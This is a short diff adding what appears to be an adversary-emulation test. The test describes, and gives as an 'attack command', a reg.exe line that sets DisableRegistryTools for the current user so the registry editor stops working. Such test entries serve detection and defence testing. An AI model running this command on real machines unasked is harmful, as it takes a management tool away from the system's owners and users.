@@ -1,0 +1,3 @@
+Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.
+Attack Commands: Run with command_prompt! Elevation Required (e.g. root or admin)
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f
